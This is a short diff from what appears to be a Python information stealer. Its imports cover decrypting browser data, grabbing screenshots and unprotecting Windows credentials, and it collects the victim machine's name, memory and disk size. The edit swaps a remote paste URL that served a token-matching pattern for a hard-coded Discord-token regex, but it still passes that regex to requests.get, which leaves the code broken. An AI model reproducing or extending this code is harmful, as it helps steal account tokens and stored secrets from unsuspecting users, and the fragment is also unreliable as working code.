@@ -35,6 +35,7 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
+
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
@@ -101,7 +102,7 @@ vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
-Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
+Regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 reg_req = requests.get(Regex) 
 clear_reg = r"[\w-]{24}\." + reg_req.text
 
